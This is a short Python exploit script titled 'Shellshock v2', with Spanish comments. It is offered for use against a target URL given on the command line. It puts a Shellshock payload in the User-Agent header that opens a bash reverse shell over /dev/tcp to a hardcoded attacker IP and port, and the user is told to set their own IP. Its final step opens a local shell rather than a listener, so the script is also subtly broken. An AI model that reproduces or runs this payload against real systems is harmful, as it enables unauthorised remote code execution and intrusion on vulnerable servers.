# Shellshock v2

```python
import sys
import requests
import subprocess

# Función que realiza el ataque de Shellshock
def shellshock_attack(target_url, attacker_ip, attacker_port):
    # Payload de Shellshock con la reverse shell interactiva
    payload = f'() {{ :; }}; /bin/bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'
    
    # Encabezados con el payload malicioso
    headers = {
        'User-Agent': payload
    }
    
    try:
        # Enviar la solicitud maliciosa a la máquina víctima
        response = requests.get(target_url, headers=headers)
        
        if response.status_code == 200:
            print(f"[*] Exploit enviado correctamente a {target_url}. Esperando conexión reverse shell...")
            
            # Ejecutar la shell directamente
            subprocess.call(["/bin/bash", "-i"])  # Abre una shell interactiva en el terminal
        else:
            print(f"[!] Error al enviar el exploit. Código de estado HTTP: {response.status_code}")
    
    except requests.exceptions.RequestException as e:
        print(f"[!] Hubo un error en la solicitud HTTP: {e}")

if __name__ == "__main__":
    # Pedir la URL de la máquina víctima
    if len(sys.argv) != 2:
        print("Uso: python3 shellshock_exploit.py <url_vulnerable>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # IP y puerto del atacante (configurados por ti)
    attacker_ip = "192.168.1.36"  # Cambia esto a tu IP
    attacker_port = 443  # Cambia esto a tu puerto

    print(f"[*] Iniciando ataque Shellshock hacia {target_url}...")
    
    # Llamar a la función para realizar el ataque
    shellshock_attack(target_url, attacker_ip, attacker_port)
```
